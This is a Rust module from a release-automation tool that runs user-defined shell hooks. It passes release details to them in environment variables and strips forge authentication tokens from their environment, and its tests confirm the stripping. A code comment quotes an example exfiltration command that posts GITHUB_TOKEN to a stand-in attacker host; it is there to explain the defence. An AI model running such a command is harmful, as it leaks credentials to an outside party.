use crate::config::OnFailure;
use crate::error_code::{self, ErrorCodeExt};
use anyhow::Result;
use colored::Colorize;
use std::path::Path;
use std::process::{Command, Stdio};

use super::{HookContext, HookPoint};

pub fn run_hook(
    point: HookPoint,
    command: &str,
    ctx: &HookContext,
    on_failure: OnFailure,
    dry_run: bool,
    verbose: bool,
    working_dir: &Path,
) -> Result<()> {
    if dry_run {
        tracing::info!(
            "  {} {} {}",
            "⊙".dimmed(),
            format!("[{}]", point.label()).dimmed(),
            command.dimmed()
        );
        return Ok(());
    }

    tracing::info!(
        "  {} {} {}",
        "▸".cyan(),
        format!("[{}]", point.label()).cyan(),
        command
    );

    let mut cmd = build_hook_command(command, ctx, working_dir);

    if verbose {
        let status = cmd
            .stdout(Stdio::inherit())
            .stderr(Stdio::inherit())
            .status()?;

        if !status.success() {
            return handle_failure(point, command, status.code(), on_failure);
        }
    } else {
        let output = cmd.output()?;

        if !output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            if !stdout.is_empty() {
                eprint!("{stdout}");
            }
            if !stderr.is_empty() {
                eprint!("{stderr}");
            }
            return handle_failure(point, command, output.status.code(), on_failure);
        }
    }

    Ok(())
}

fn build_hook_command(command: &str, ctx: &HookContext, working_dir: &Path) -> Command {
    let mut cmd = build_command(command);
    // Hooks are user-defined arbitrary shell — strip every token the tool
    // authenticates with so a hook can't `curl evil.com -d $GITHUB_TOKEN`.
    cmd.current_dir(working_dir);
    for var in crate::config::all_token_env_vars() {
        cmd.env_remove(var);
    }
    cmd.env("FERRFLOW_PACKAGE", &ctx.package)
        .env("FERRFLOW_OLD_VERSION", &ctx.old_version)
        .env("FERRFLOW_NEW_VERSION", &ctx.new_version)
        .env("FERRFLOW_BUMP_TYPE", &ctx.bump_type)
        .env("FERRFLOW_TAG", &ctx.tag)
        .env("FERRFLOW_DRY_RUN", ctx.dry_run.to_string())
        .env("FERRFLOW_PACKAGE_PATH", &ctx.package_path)
        .env("FERRFLOW_CHANNEL", ctx.channel.as_deref().unwrap_or(""))
        .env("FERRFLOW_IS_PRERELEASE", ctx.is_prerelease.to_string())
        .env("FERRFLOW_MONOREPO", ctx.monorepo.to_string())
        .env("FERRFLOW_CHANGELOG", &ctx.changelog)
        .env(
            "FERRFLOW_COMMITS_JSON",
            serde_json::to_string(&ctx.commits).unwrap_or_else(|_| "[]".to_string()),
        )
        .env(
            "FERRFLOW_BUMPED_FILES_JSON",
            serde_json::to_string(&ctx.bumped_files).unwrap_or_else(|_| "[]".to_string()),
        )
        .env(
            "FERRFLOW_ALL_PACKAGES_JSON",
            serde_json::to_string(&ctx.all_packages).unwrap_or_else(|_| "[]".to_string()),
        )
        .env(
            "FERRFLOW_RELEASE_URL",
            ctx.release_url.as_deref().unwrap_or(""),
        )
        .env(
            "FERRFLOW_ERROR_CODE",
            ctx.error_code.as_deref().unwrap_or(""),
        );

    cmd
}

#[cfg(not(windows))]
fn build_command(command: &str) -> Command {
    let mut cmd = Command::new("sh");
    cmd.args(["-c", command]);
    cmd
}

#[cfg(windows)]
fn build_command(command: &str) -> Command {
    let mut cmd = Command::new("cmd");
    cmd.args(["/C", command]);
    cmd
}

fn handle_failure(
    point: HookPoint,
    command: &str,
    code: Option<i32>,
    on_failure: OnFailure,
) -> Result<()> {
    let code_str = code
        .map(|c| c.to_string())
        .unwrap_or_else(|| "signal".to_string());

    match on_failure {
        OnFailure::Abort => Err(anyhow::anyhow!(
            "hook [{}] failed (exit {}): {}",
            point.label(),
            code_str,
            command
        ))
        .error_code(error_code::HOOK_FAILED)?,
        OnFailure::Continue => {
            tracing::warn!(
                "{}",
                format!(
                    "  Warning: hook [{}] failed (exit {}): {}",
                    point.label(),
                    code_str,
                    command
                )
                .yellow()
            );
            Ok(())
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn handle_failure_abort_returns_error() {
        let result = handle_failure(HookPoint::PreBump, "echo fail", Some(1), OnFailure::Abort);
        assert!(result.is_err());
        let msg = format!("{:?}", result.unwrap_err());
        assert!(msg.contains("pre_bump"));
        assert!(msg.contains("exit 1"));
        assert!(msg.contains("echo fail"));
    }

    #[test]
    fn handle_failure_continue_returns_ok() {
        let result = handle_failure(
            HookPoint::PostBump,
            "echo fail",
            Some(42),
            OnFailure::Continue,
        );
        assert!(result.is_ok());
    }

    #[test]
    fn handle_failure_signal_no_exit_code() {
        let result = handle_failure(HookPoint::PreCommit, "killed", None, OnFailure::Abort);
        assert!(result.is_err());
        assert!(format!("{:?}", result.unwrap_err()).contains("signal"));
    }
}

#[cfg(test)]
mod hook_env_tests {
    use super::*;
    use crate::config::{ForgeKind, all_token_env_vars};

    fn ctx() -> HookContext {
        HookContext {
            package: "app".into(),
            old_version: "1.0.0".into(),
            new_version: "1.1.0".into(),
            bump_type: "minor".into(),
            tag: "v1.1.0".into(),
            dry_run: false,
            package_path: ".".into(),
            channel: None,
            error_code: None,
            monorepo: false,
            is_prerelease: false,
            changelog: String::new(),
            commits: Vec::new(),
            bumped_files: Vec::new(),
            all_packages: Vec::new(),
            release_url: None,
        }
    }

    fn removed_vars(cmd: &Command) -> Vec<String> {
        cmd.get_envs()
            .filter(|(_, value)| value.is_none())
            .map(|(key, _)| key.to_string_lossy().into_owned())
            .collect()
    }

    #[test]
    fn every_forge_token_env_var_is_stripped_from_the_hook_environment() {
        let cmd = build_hook_command("true", &ctx(), Path::new("."));
        let removed = removed_vars(&cmd);

        for var in all_token_env_vars() {
            assert!(
                removed.iter().any(|r| r == var),
                "{var} reaches the hook environment; removed = {removed:?}"
            );
        }
    }

    #[test]
    fn the_stripped_list_covers_every_token_resolve_token_reads() {
        let removed = removed_vars(&build_hook_command("true", &ctx(), Path::new(".")));

        for kind in ForgeKind::ALL {
            for var in kind.token_env_vars() {
                assert!(
                    removed.iter().any(|r| r == var),
                    "{kind:?} authenticates with {var} but hooks still see it"
                );
            }
        }
    }

    #[test]
    fn context_variables_are_still_provided_to_the_hook() {
        let cmd = build_hook_command("true", &ctx(), Path::new("."));
        let provided: Vec<String> = cmd
            .get_envs()
            .filter(|(_, value)| value.is_some())
            .map(|(key, _)| key.to_string_lossy().into_owned())
            .collect();

        assert!(provided.iter().any(|k| k == "FERRFLOW_NEW_VERSION"));
        assert!(provided.iter().any(|k| k == "FERRFLOW_TAG"));
    }
}
